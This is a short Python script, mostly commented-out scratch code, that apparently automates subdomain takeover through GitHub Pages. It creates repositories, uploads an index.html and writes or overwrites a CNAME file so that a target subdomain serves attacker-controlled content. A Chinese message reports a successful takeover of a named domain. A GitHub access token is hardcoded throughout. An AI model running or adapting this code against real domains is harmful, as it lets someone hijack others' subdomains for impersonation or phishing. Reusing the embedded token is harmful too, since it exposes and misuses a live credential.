import requests,json,yaml,base64

# name = 'Hello-World'

# d = {
#   "name": name,
#   "description": "This is a subdomain takeover Repository",
#   "homepage": "https://github.com"
# }
# token = 'd255c6dd17e4b3bd3095106343b5cd7c5457976f'
# headers = {
# "Authorization": 'token '+ token,
# "Accept": "application/vnd.github.baptiste-preview+json"
# }
# url = 'https://api.github.com/user/repos'
# r = requests.post(url=url,headers=headers,data=json.dumps(d))
# print(r.text)

# token = 'd255c6dd17e4b3bd3095106343b5cd7c5457976f'
# headers = {
# "Authorization": 'token '+ token,
# "Accept": "application/vnd.github.baptiste-preview+json"
# }

# url = 'https://api.github.com/repos/Echocipher/test.subdomain.takeover'
# r = requests.get(url=url,headers=headers)
# # print(r.json()['message'])
# print(r.json())
# for i in r.json():
#     print(i['name'])

# with open ('config.yml') as stream:
#     data = yaml.load(stream,Loader=yaml.FullLoader)
#     print(data['Repo'][0]['name'])

# for i in range(0,10):
#     print(i)

# def uplod_git(repo_name,token,url,user):
#     html = b'''
#     <html>
#         <p>Subdomain Takerover Test</>
#     </html>
#     '''
#     url = bytes(url,encoding='utf-8')
#     html64 = base64.b64encode(html).decode('utf-8')
#     url64 = base64.b64encode(url).decode('utf-8')
#     # index.html文件
#     html_dict = {
#            "message": "my commit message",
#            "committer": {
#              "name": "user",
#              "email": "user@163.com"
#            },
#            "content": html64
#         }
#     # CNAME文件
#     url_dict = {
#            "message": "my commit message",
#            "committer": {
#              "name": "user",
#              "email": "user@163.com"
#            },
#            "content": url64
#         }
#     html_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/index.html'
#     url_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/CNAME'
#     html_r = requests.put(url=html_url,data=json.dumps(html_dict), headers=CHECK_HEADERS)
#     cname_r = requests.put(url=url_url,data=json.dumps(url_dict), headers=CHECK_HEADERS)
#     rs=cname_r.status_code
#     if rs==201:
#         print('[+]自动接管成功，请访问http://test.djmag.club查看结果')
#     else:
#         print('[+]自动接管失败，请检查网络或稍后重试...')




token = 'd255c6dd17e4b3bd3095106343b5cd7c5457976f'
headers = {
"Authorization": 'token '+ token,
"Accept": "application/vnd.github.baptiste-preview+json"
}

url = "https://api.github.com/repos/Echocipher/my.subdomain.takerover/contents/CNAME"

r1 = requests.get(url=url,headers=headers)
if r1.status_code == 200:
    sha = json.loads(r1.text)['sha']
else:
    sha=''

d={
  "message": "my commit message update",
  "committer": {
    "name": "user",
    "email": "user@163.com"
  },
  "content": "dGVzdC5oZWppYWh1YW4uY29t",
  "sha":sha
}

r = requests.put(url=url,data=json.dumps(d), headers=headers)
print(r.status_code)